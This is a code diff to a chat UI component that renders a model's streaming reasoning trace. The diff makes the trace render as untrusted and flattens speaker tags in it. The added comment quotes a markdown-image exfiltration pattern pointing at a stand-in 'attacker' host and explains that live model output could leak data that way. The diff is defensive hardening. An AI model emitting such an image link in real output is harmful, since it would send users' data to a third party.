@@ -19,8 +19,16 @@
 // unterminated code fence or an unpaired emphasis marker exactly like the answer body can). Once
 // thinking ends the trace is settled (no more reasoning deltas expected), so it renders as-is, same as
 // the answer body gates its own repair pass on `streaming`.
+//
+// STREAM CONTENT IS UNTRUSTED (D44 §12.0 as corrected #25, UI-Gates §11.6): the reasoning trace is LIVE
+// model output on the streaming path, so it renders `untrusted` for the same reason the ghost answer
+// body does — a mid-stream `![](https://attacker/?d=…)` would exfiltrate before commit-time
+// sanitization. The trace is pre-passed through `speakerTagsToPlain` (like the ghost body) so a
+// complete `<speaker>` marker degrades to a plain `Name:` prefix instead of being dropped element+child
+// by the untrusted allowlist.
 
 import { holdTornSpeaker } from "@orb/kit/fix-markdown";
+import { speakerTagsToPlain } from "@orb/kit/speaker-label";
 import { Collapsible, CollapsiblePanel, CollapsibleTrigger } from "@orb/ui/collapsible";
 // biome-ignore lint/correctness/noUnresolvedImports: biome can't follow @orb/ui/icons' re-export of the lucide-react glyphs (external .d.ts); tsc resolves the barrel (same class as react's Suspense in query-boundary.tsx).
 import { BrainCircuit, ChevronDown, ChevronRight, Icon } from "@orb/ui/icons";
@@ -71,8 +79,9 @@ export function ReasoningBlock({
   const label = thinking ? `Thinking… ${elapsedSeconds}s` : `Thought for ${elapsedSeconds}s`;
   const paced = useSmoothText(reasoning, { enabled: thinking, cps: REASONING_CPS });
   // #38: Streamdown 2.5 repairs the streaming tail itself (mode="streaming"); only the torn-`<speaker>`
-  // hold-back remains unique to us. Applies while thinking; settled traces render as-is.
-  const held = thinking ? holdTornSpeaker(paced) : paced;
+  // hold-back remains unique to us. Applies while thinking; settled traces render as-is. `speakerTagsToPlain`
+  // then flattens any complete `<speaker>` marker to `Name:` (the untrusted seal drops the tag+child — head).
+  const held = speakerTagsToPlain(thinking ? holdTornSpeaker(paced) : paced);
 
   return (
     <Collapsible open={expanded} onOpenChange={(next): void => setOverride(next)}>
@@ -94,7 +103,7 @@ export function ReasoningBlock({
         {held.length === 0 ? (
           <StreamShimmer label="Reading the reasoning trace…" />
         ) : (
-          <Markdown trust="trusted" mode={thinking ? "streaming" : "static"}>
+          <Markdown trust="untrusted" mode={thinking ? "streaming" : "static"}>
             {held}
           </Markdown>
         )}
